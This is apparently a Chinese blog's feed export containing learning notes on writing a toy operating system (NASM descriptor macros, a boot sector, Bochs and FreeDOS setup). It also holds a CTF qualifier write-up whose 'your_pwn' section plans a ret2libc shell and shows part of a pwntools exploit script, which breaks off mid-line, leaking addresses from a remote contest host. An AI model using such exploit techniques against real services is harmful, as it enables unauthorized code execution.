class="line"></span><br><span class="line">DA_DPL0EQU00h; DPL = 0 0000 0000</span><br><span class="line">DA_DPL1EQU20h; DPL = 1 0010 0000</span><br><span class="line">DA_DPL2EQU40h; DPL = 2 0100 0000</span><br><span class="line">DA_DPL3EQU60h; DPL = 3 0110 0000</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">; 存储段描述符类型值说明</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">DA_DREQU90h; 存在的只读数据段类型值  1001 0000</span><br><span class="line">DA_DRWEQU92h; 存在的可读写数据段属性值 1001 0010</span><br><span class="line">DA_DRWAEQU93h; 存在的已访问可读写数据段类型值 1001 0011</span><br><span class="line">DA_CEQU98h; 存在的只执行代码段属性值 1001 1000</span><br><span class="line">DA_CREQU9Ah; 存在的可执行可读代码段属性值 1001 1010</span><br><span class="line">DA_CCOEQU9Ch; 存在的只执行一致代码段属性值 1001 1100</span><br><span class="line">DA_CCOREQU9Eh; 存在的可执行可读一致代码段属性值 1001 1110</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">; 系统段描述符类型值说明</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">DA_LDTEQU82h; 局部描述符表段类型值 1000 0010</span><br><span class="line">DA_TaskGateEQU85h; 任务门类型值 1000 0101</span><br><span class="line">DA_386TSSEQU89h; 可用 386 任务状态段类型值 1000 1001</span><br><span class="line">DA_386CGateEQU8Ch; 386 调用门类型值 1000 1100</span><br><span class="line">DA_386IGateEQU8Eh; 386 中断门类型值 1000 1110</span><br><span class="line">DA_386TGateEQU8Fh; 386 陷阱门类型值 1000 1111</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">; 选择子类型值说明</span><br><span class="line">; 其中:</span><br><span class="line">;       SA_  : Selector Attribute</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SA_RPL0EQU0; ┓00</span><br><span class="line">SA_RPL1EQU1; ┣RPL01</span><br><span class="line">SA_RPL2EQU2; ┃10</span><br><span class="line">SA_RPL3EQU3; ┛11</span><br><span class="line"></span><br><span class="line">SA_TIGEQU0; ┓TI 0000</span><br><span class="line">SA_TILEQU4; ┛  0100</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;宏----------------------------------------------------------------------------------------</span><br><span class="line">;</span><br><span class="line">; 描述符</span><br><span class="line">; usage: Descriptor Base, Limit, Attr</span><br><span class="line">;        Base:  dd</span><br><span class="line">;        Limit: dd (low 20 bits available)低二十位可用</span><br><span class="line">;        Attr:  dw (lower 4 bits of higher byte are always 0)高字节的低四位始终为0</span><br><span class="line">%macroDescriptor 3 ;段界限为低地址 1代表Base 2代表Limit 3代表属性 </span><br><span class="line">dw%2 &amp; 0FFFFh; 段界限 1(2 字节)</span><br><span class="line">dw%1 &amp; 0FFFFh; 段首地址 1(2 字节)</span><br><span class="line">db(%1 &gt;&gt; 16) &amp; 0FFh; 段首地址 2(1 字节)</span><br><span class="line">dw((%2 &gt;&gt; 8) &amp; 0F00h) | (%3 &amp; 0F0FFh)</span><br><span class="line">; 属性 1 + 段界限 2 + 属性 2(2 字节)</span><br><span class="line">db(%1 &gt;&gt; 24) &amp; 0FFh; 段首地址 3(1 字节)</span><br><span class="line">%endmacro ; 共 8 字节</span><br><span class="line">;</span><br><span class="line">; 门</span><br><span class="line">; usage: Gate Selector, Offset, DCount, Attr</span><br><span class="line">;        Selector:  dw</span><br><span class="line">;        Offset:    dd</span><br><span class="line">;        DCount:    db</span><br><span class="line">;        Attr:      db</span><br><span class="line">%macro Gate 4 ;1代表Selector 2代表Offset 3代表DCount 4代表Attr</span><br><span class="line">dw(%2 &amp; 0FFFFh); 偏移 1(2 字节)</span><br><span class="line">dw%1; 选择子(2 字节)</span><br><span class="line">dw(%3 &amp; 1Fh) | ((%4 &lt;&lt; 8) &amp; 0FF00h); 属性(2 字节)</span><br><span class="line">dw((%2 &gt;&gt; 16) &amp; 0FFFFh); 偏移 2(2 字节)</span><br><span class="line">%endmacro ; 共 8 字节</span><br></pre></td></tr></table></figure><p>最后编译pmtest1.com</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm pmtest1.asm -o pmtest1.com</span><br></pre></td></tr></table></figure><p>#第三步：在freedos中运行pmtest1.com<br>这里可以用linux下的mount命令，在mnt目录下创建一个文件，然后和pm.img关联</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /mnt/floppy</span><br><span class="line"></span><br><span class="line">sudo mount -o loop pm.img /mnt/floppy</span><br><span class="line"></span><br><span class="line">sudo cp pmtest1.com /mnt/floppy</span><br><span class="line"></span><br><span class="line">sudo umount /mnt/floppy</span><br></pre></td></tr></table></figure><p>运行freedos，在b盘可以看到出现了pmtest1.com<br><img src="/images/minisystem/2019-5-29-section3-4.png" alt="avatar"><br>然后输入pmtest1.com就可以运行了<br><img src="/images/minisystem/2019-5-29-section3-5.png" alt="avatar"><br>屏幕出现了一个红色P，说明pmtest运行成功</p><p>参考自<a href="https://blog.csdn.net/yudale/article/details/68500536" target="_blank" rel="noopener">https://blog.csdn.net/yudale/article/details/68500536</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-5-28-自己动手写操作系统(2)</title>
      <link href="/passages/2019-5-28-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(2)/"/>
      <url>/passages/2019-5-28-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(2)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习完第一章后，成功运行了一个OS版的hello world，第二章主要是讲环境搭建以及之后实验在各种平台可能用到的各种工具，组合五花八门，因为是05年的书，我参考了网上近两年的博客后决定使用linux下的bochs作为之后os的调试工具</p><h1 id="第一步：安装bochs"><a href="#第一步：安装bochs" class="headerlink" title="第一步：安装bochs"></a>第一步：安装bochs</h1><p>环境：VM14+Ubuntu16.04</p><h2 id="1、配置bochs所需环境"><a href="#1、配置bochs所需环境" class="headerlink" title="1、配置bochs所需环境"></a>1、配置bochs所需环境</h2><p>Bochs 需要在 X11 环境下运行，因此你的 Linux 系统必须已经安装了X Window 系统才能使用Bochs</p><p>关于这一点可以在自己的linux通过ps -e|grep ‘tty’查看，可以看到ubuntu16运行了Xorg，这是X windows的一种（图形用户界面的一种）<br><img src="/images/minisystem/2019-5-28-section2-1.png" alt="avatar"></p><p>因为 Bochs 是用C++写的，所以这里要安装GNU gcc/g++编译器。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential </span><br><span class="line">sudo apt-get install xorg-dev </span><br><span class="line">sudo apt-get install bison </span><br><span class="line">sudo apt-get install g++</span><br></pre></td></tr></table></figure><h2 id="2、随后便是安装bochs了"><a href="#2、随后便是安装bochs了" class="headerlink" title="2、随后便是安装bochs了"></a>2、随后便是安装bochs了</h2><p>先在<a href="https://sourceforge.net/projects/bochs/files/下载压缩文件（其实也可以用sudo" target="_blank" rel="noopener">https://sourceforge.net/projects/bochs/files/下载压缩文件（其实也可以用sudo</a> apt-get install vgabios bochs bochs-x bximage来安装，但缺点是这样安装的bochs默认是不能进行调试的）</p><p>之后解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf bochs-2.6.9.tar.gz</span><br></pre></td></tr></table></figure><p>随后进入bochs-2.6.9目录，运行configure脚本，它会测试你的机器，C/C++编译器以及一些库，用来判断何种配置适合于你的机器。运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure --enable-debugger --enable-disasm</span><br></pre></td></tr></table></figure><p>（这两个是用来开启调试和反汇编功能）</p><p>第3步正确运行后，会产生一个Makefile文件，然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure><p>最后安装bochs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>安装成功后就可以在终端内输入bochs启动了<br><img src="/images/minisystem/2019-5-28-section2-2.png" alt="avatar"></p><h2 id="3、bochs2-6-9运行遇到的各种错误及解决方法"><a href="#3、bochs2-6-9运行遇到的各种错误及解决方法" class="headerlink" title="3、bochs2.6.9运行遇到的各种错误及解决方法"></a>3、bochs2.6.9运行遇到的各种错误及解决方法</h2><p>这里运行成功，但是最后却报错了，安装过程应该没问题，但是配置出现了错误，因此修改bochsrc文件(能运行bochs但出错了，基本都是配置的错误)<br>先备份bochrc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./.bochsrc /home/stars/bochsrc.bak</span><br></pre></td></tr></table></figure><p>根据报错信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000000e[      ] .bochsrc:187: wrong value for parameter &apos;model&apos;</span><br><span class="line">00000000000p[      ] &gt;&gt;PANIC&lt;&lt; .bochsrc:187: cpu directive malformed.</span><br></pre></td></tr></table></figure><p>可见是cpu的model设置错了<br>解决方法如下：<br>先查看bochs有哪些cpu model</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bochs -help cpu</span><br></pre></td></tr></table></figure><p><img src="/images/minisystem/2019-5-28-section2-3.png" alt="avatar"><br>因为我的cpu是intel core所以我把cpu model改成core_duo_t2400_yonah<br><img src="/images/minisystem/2019-5-28-section2-4.png" alt="avatar"><br>注释内容是默认配置</p><p>修改配置后又遇到了新的错误:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bochsrc:915: Bochs is not compiled with lowlevel sound support</span><br></pre></td></tr></table></figure><p><img src="/images/minisystem/2019-5-28-section2-5.png" alt="avatar"><br>解决方法如下：<br>注释掉915行的sound（vim小技巧, : n 可以直接跳到第n行）<br><img src="/images/minisystem/2019-5-28-section2-6.png" alt="avatar"></p><p>再次运行bochs<br><img src="/images/minisystem/2019-5-28-section2-7.png" alt="avatar"><br>成功运行</p><p>安装步骤参考<a href="https://www.linuxidc.com/Linux/2016-10/135905.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2016-10/135905.htm</a><br>错误调试步骤参考<a href="https://www.cnblogs.com/lr-ting/p/10585836.html" target="_blank" rel="noopener">https://www.cnblogs.com/lr-ting/p/10585836.html</a></p><h1 id="第二步：在bochs上加载img"><a href="#第二步：在bochs上加载img" class="headerlink" title="第二步：在bochs上加载img"></a>第二步：在bochs上加载img</h1><p>首先是在**/bochs-2.6.9目录下创建新目录minios，然后把要运行的镜像boot.img拷贝进去<br>随后在minios目录下创建配置文件bochsrc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim bochsrc</span><br></pre></td></tr></table></figure><p>配置内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注意&apos;#&apos;后面为注注释内容</span><br><span class="line"></span><br><span class="line">#模拟器的内存 </span><br><span class="line">megs:128</span><br><span class="line"></span><br><span class="line">#这个是BIOS-bochs-latest的路径,自己慢慢找,不一定和我的一样</span><br><span class="line">romimage:file=/usr/local/share/bochs/BIOS-bochs-latest</span><br><span class="line"></span><br><span class="line">#这个是VGABIOS-lgpl-latest的路径,自己慢慢找</span><br><span class="line">vgaromimage:file=/usr/local/share/bochs/VGABIOS-lgpl-latest </span><br><span class="line"></span><br><span class="line">#这个是启动软盘,就是我们下载的那个,就在当前目录下，如果不在当前目录，需要指明路径 </span><br><span class="line">floppya:1_44=boot.img,status=inserted</span><br><span class="line"></span><br><span class="line">#表示从软盘启动</span><br><span class="line">boot:floppy </span><br><span class="line"></span><br><span class="line">#日志输出文件</span><br><span class="line">log:bochsout.txt </span><br><span class="line"></span><br><span class="line">#选项还有很多,想了解更多可以参照原始的.bochsrc文件（在bochs-2.6.9/目录下）</span><br></pre></td></tr></table></figure><p>配置文件写好后就执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bochs -f bochsrc （-f 选项表示指定配置文件，后面跟着我们刚写好的配置文件名）</span><br></pre></td></tr></table></figure><p>之后输入c，也就是continue，就能运行boot.img<br><img src="/images/minisystem/2019-5-28-section2-8.png" alt="avatar"><br>可以看到虚拟机界面左上角出现了hello world，运行成功，之所以界面很乱，是因为我们的boot.img只是在屏幕的左上角显示hello world，在此之前并没有清空屏幕，所以bochs初始化遗留的内容还保留在屏幕上</p><p>在加载虚拟机之前<br>[0x0000fffffff0] f000:fff0 (unk. ctxt): jmpf 0xf000:e05b          ; ea5be000f0<br>其中jmpf 0xf000:e05b指的是跳转到ROM-BIOS的地址，随后我们输入c，才会加载镜像。</p><p>加载boot.img镜像的步骤参考自<a href="https://blog.csdn.net/the_chosen_1/article/details/88918766#linux011_48" target="_blank" rel="noopener">https://blog.csdn.net/the_chosen_1/article/details/88918766#linux011_48</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-5-28-自己动手写操作系统(1)</title>
      <link href="/passages/2019-5-28-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(1)/"/>
      <url>/passages/2019-5-28-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(1)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>期末了，学校的操作系统课需要提交课程设计，想想这学期课程做的五个实验，dhcp、dns、web、ftp、email服务器搭建，实在不知道学校在教什么，所以决定自学写一个操作系统，自己写一个操作系统应该也是很多新手程序员的浪漫理想吧，接下来就是针对《自己动手写操作系统》的学习笔记，全书分为7章。</p><h1 id="第一天：第一章-马上动手写一个最小的“操作系统”"><a href="#第一天：第一章-马上动手写一个最小的“操作系统”" class="headerlink" title="第一天：第一章-马上动手写一个最小的“操作系统”"></a>第一天：第一章-马上动手写一个最小的“操作系统”</h1><p>开发环境：<br>win10<br>VM14+ubuntu16.04</p><p>之后是实验步骤</p><h2 id="1、准备汇编编译器编译-nasm"><a href="#1、准备汇编编译器编译-nasm" class="headerlink" title="1、准备汇编编译器编译 nasm"></a>1、准备汇编编译器编译 nasm</h2><p>sudo apt-get install nasm</p><h2 id="2、编译boot-asm"><a href="#2、编译boot-asm" class="headerlink" title="2、编译boot.asm"></a>2、编译boot.asm</h2><p>在windows上用notepad++直接写一个boot.asm然后复制到ubuntu中（懒得安装中文输入法了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">org 07c00h;告速编译器程序加载到7c00处</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">call DispStr;调用显示字符串例程</span><br><span class="line">jmp $;无限循环,$表示当前地址,也就是jmp $的地址，这一步能防止代码进入数据区</span><br><span class="line">DispStr:</span><br><span class="line">mov ax,BootMessage</span><br><span class="line">mov bp,ax;es:bp = 串地址</span><br><span class="line">mov cx,16;cx = 串长度</span><br><span class="line">mov ax,01301h;ah = 13, al = 01h</span><br><span class="line">mov bx,000ch;页号为0(bh = 0)黑底红字(b1=0Ch,高亮)</span><br><span class="line">mov dl,0</span><br><span class="line">int 10h;10h 号中断</span><br><span class="line">ret</span><br><span class="line">BootMessage:db&quot;Hello, OS world!&quot;</span><br><span class="line">times 510-($-$$)db0;填充剩下的空间，使生成的二进制代码恰好为512字节</span><br><span class="line">;$$表示当前节(section)起始地址</span><br><span class="line">;在这个只有一节的程序中就是org 07c00h的地址</span><br><span class="line">;所以$$-$就是该段程序从起始到time 510-($-$$)的长度</span><br><span class="line">;加上最后的dw 0xaa55就是512字节</span><br><span class="line">dw 0xaa55;结束标志</span><br></pre></td></tr></table></figure><p>然后编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm boot.asm -o boot.bin</span><br></pre></td></tr></table></figure><h2 id="3、制作软盘（系统启动盘）"><a href="#3、制作软盘（系统启动盘）" class="headerlink" title="3、制作软盘（系统启动盘）"></a>3、制作软盘（系统启动盘）</h2><p>空白软盘 这种上古玩意大概只有老师才有了，如今可以使用dd命令制作虚拟软盘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=boot.bin of=boot.img</span><br></pre></td></tr></table></figure><p>参数含义：<br>if=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt; if=input file &gt;<br>of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt;<br>更多参数可以参考<a href="https://www.cnblogs.com/jikexianfeng/p/6103500.html" target="_blank" rel="noopener">https://www.cnblogs.com/jikexianfeng/p/6103500.html</a><br>将得到的boot.img从虚拟机复制到windows中</p><h2 id="4、通过VM的空白虚拟机加载boot-img"><a href="#4、通过VM的空白虚拟机加载boot-img" class="headerlink" title="4、通过VM的空白虚拟机加载boot.img"></a>4、通过VM的空白虚拟机加载boot.img</h2><p>在VM中创建空白的虚拟机，虚拟机类型我选择其它<br><img src="/images/minisystem/2019-5-28-section1-1.png" alt="avatar"><br>随后在设置中把cd/dvd和网络适配器的自动连接去掉<br><img src="/images/minisystem/2019-5-28-section1-4.png" alt="avatar"><br>之后添加软盘驱动器<br><img src="/images/minisystem/2019-5-28-section1-2.png" alt="avatar"><br>最后在使用软盘映像文件中选择boot.img<br><img src="/images/minisystem/2019-5-28-section1-3.png" alt="avatar"><br>打开虚拟机，实验成功！我们踏出了第一步<br><img src="/images/minisystem/2019-5-28-section1-5.png" alt="avatar"></p><p>在编译过程中可能遇到 label or instruction expected at start of line，基本是格式或者编码的问题，自己手打一遍代码，注意空格和tab是不一样的。</p><p>以上实验步骤参考了<br><a href="https://blog.csdn.net/zashizhi3299/article/details/80870073" target="_blank" rel="noopener">https://blog.csdn.net/zashizhi3299/article/details/80870073</a> 中的空白虚拟机加载虚拟软盘<br><a href="https://blog.csdn.net/YuDale/article/details/65644241" target="_blank" rel="noopener">https://blog.csdn.net/YuDale/article/details/65644241</a> 中的虚拟软盘创建</p><h1 id="关于boot-asm的汇编解析-int-10h"><a href="#关于boot-asm的汇编解析-int-10h" class="headerlink" title="关于boot.asm的汇编解析(int 10h)"></a>关于boot.asm的汇编解析(int 10h)</h1><p>BIOS的10H中断的13号中断用于显示字符串，参数为：</p><p>1、AH＝13H</p><p>2、AL＝显示方式</p><pre><code>如果AL＝0，表示目标字符串仅仅包含字符，属性在BL中包含，不移动光标如果AL＝1，表示目标字符串仅仅包含字符，属性在BL中包含，移动光标如果AL＝2，表示目标字符串包含字符和属性，不移动光标如果AL＝3，表示目标字符串包含字符和属性，移动光标总之，可以归纳为：         ｜BIT7｜BIT6｜BIT5｜BIT4｜BIT3｜BIT2｜BIT1｜BIT0｜ AL       BIT0为0表示不移动光标，为1表示移动光标       BIT1为0表示字符串仅包含字符，为1表示字符串包含属性       BIT2~BIT7未使用</code></pre><p>3、BH表示视频区页数</p><p>4、如果AL的BIT1为0，则BL表示显示属性。属性为：</p><pre><code>｜BIT7｜BIT6｜BIT5｜BIT4｜BIT3｜BIT2｜BIT1｜BIT0｜ BL   BIT7：背景是否闪烁。0不闪烁，1闪烁   BIT6~BIT4为背景色，分别为RGB，000为黑色，111为白色   BIT3为1，则前景色加亮，为0则不加亮   BIT2－BIT0为前景色，意义同背景色</code></pre><p>5、CX为字符串长度</p><p>6、DH表示在第几行显示（0为第一行）</p><p>7、DL表示在第几列显示（0为第一列）</p><p>8、ES：BP指向字符串<br>参考自<a href="https://blog.csdn.net/pdcxs007/article/details/43378229" target="_blank" rel="noopener">https://blog.csdn.net/pdcxs007/article/details/43378229</a></p><p>在王爽的《汇编语言》第三版第九章也有关于显示字符的实验，不过不是通过int 10h中断实现的，而是通过在内存地址B8000H-BFFFFH的空间内写入数据，这样会直接在屏幕上显示字符。</p><h1 id="关于boot-asm的汇编解析-org-07c00h"><a href="#关于boot-asm的汇编解析-org-07c00h" class="headerlink" title="关于boot.asm的汇编解析(org 07c00h)"></a>关于boot.asm的汇编解析(org 07c00h)</h1><p>大部分程序是不需要org的，因为程序装载的时候通常会装载到xxxxH:0000H的位置，也就是偏移0<br>而org xxxx的含义是它告诉汇编器，把所有对内存的地址引用全都加上xxxx，这在程序被强制加载到非0000h偏移时很有用<br>一般编程不加org，因为程序默认加载地址的偏移就是0000h，可写引导扇区时，程序会被加载到0000段，偏移7c00，偏移不是0000，所以用org让所有的内存引用全都加上7c00h。于是，在引导扇区程序里，我们开头会看到这么一句 org 7c00h，因为汇编里十六进制要以数字开头，所以应该这么写org 07c00h。</p><p>参考自：<a href="https://blog.csdn.net/mirage1993/article/details/29908929" target="_blank" rel="noopener">https://blog.csdn.net/mirage1993/article/details/29908929</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-21-第十二届全国信息竞赛预赛</title>
      <link href="/passages/2019-4-21-%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E4%BF%A1%E6%81%AF%E7%AB%9E%E8%B5%9B%E9%A2%84%E8%B5%9B/"/>
      <url>/passages/2019-4-21-%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E4%BF%A1%E6%81%AF%E7%AB%9E%E8%B5%9B%E9%A2%84%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC-签到"><a href="#MISC-签到" class="headerlink" title="MISC-签到"></a>MISC-签到</h2><p>打开exe文件，报错，出现opencv的字样，估计是图像识别，果断打开摄像头，发现人头会被绿圈圈出，题目是三人行，因为是单人队伍，只好手机百度人像让他识别了。</p><h2 id="RE-easyGo"><a href="#RE-easyGo" class="headerlink" title="RE-easyGo"></a>RE-easyGo</h2><p>第一天就一道re，easygo，百度查可能是go语言写的，找不到函数入口，然后这题几分钟就被人秒了，我就估计是非常简单的，然后直接查字符串，flag、congr、correct、Try之类的，最后发现几个说明flag正确或失败的字符串都在sub_495150被调用，然后在几个调用点下断点，就发现flag在寄存器里<br><img src="/images/2019-4-21-dishierjie/2019-4-21-easygo2.png" alt="avatar"><br><img src="/images/2019-4-21-dishierjie/2019-4-21-easygo1.png" alt="avatar"></p><h2 id="PWN-your-pwn"><a href="#PWN-your-pwn" class="headerlink" title="PWN-your_pwn"></a>PWN-your_pwn</h2><p><img src="/images/2019-4-21-dishierjie/2019-4-24-yourpwn1.png" alt="avatar"><br>溢出点挺明显的，对数组边界没有进行检查，造成任意地址写入和任意地址泄露<br>因为程序开了NX和PIE，所以在执行ret2libc的时候要先泄露地址<br>初步想法是<br>拿到返回地址<br>计算出rop rdi<br>计算出system_plt<br>拿到栈地址<br>计算出/bin/sh的地址</p><p>下一轮</p><p>放入/bin/sh<br>修改返回rop<br>修改/bin/sh_addr<br>修改system_plt</p><p>Objdump -s pwn查看程序plt表，没发现system，但是发现了puts<br>因为程序加载的基址是不会对地址最后12bit进行随机化的，所以可以根据后12位判断libc库，<a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>写泄露脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">s=remote(<span class="string">'39.97.228.196'</span>,<span class="number">60007</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getaddr</span><span class="params">(num,addr)</span>:</span></span><br><span class="line">s.sendlineafter(<span class="string">'input index'</span>,str(num))</span><br><span class="line">re=s.recvuntil(<span class="string">'input'</span>)[<span class="number">-8</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="keyword">if</span> int(re,<span class="number">16</span>)&lt;=<span class="number">15</span>:</span><br><span class="line">addr=<span class="string">"0"</span>+hex(int(re,<span class="number">16</span>))[<span class="number">2</span>:]+addr</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">addr=str(hex(int(re,<span class="number">16</span>)))[<span class="number">2</span>:]+addr</span><br><span class="line">s.sendlineafter(<span class="string">'new value'</span>,str(int(re,<span class="number">16</span>)))</span><br><span class="line"><span class="comment">#print addr</span></span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,addr)</span>:</span></span><br><span class="line">s.sendlineafter(<span class="string">'input index'</span>,str(num))</span><br><span class="line">re=s.recvuntil(<span class="string">'input'</span>)[<span class="number">-8</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="comment">#addr=str(hex(int(re,16)))[2:]+addr</span></span><br><span class="line">s.sendlineafter(<span class="string">'new value'</span>,str(int(addr,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">'name:'</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">b11_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">b11_addr=getaddr(<span class="number">344</span>+i,b11_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"b11_addr:"</span>+b11_addr</span><br><span class="line"></span><br><span class="line">base_addr=int(b11_addr,<span class="number">16</span>)<span class="number">-0xb11</span></span><br><span class="line"><span class="comment">#system_plt=base_addr+elf.plt['system']</span></span><br><span class="line">popedi_addr=base_addr+<span 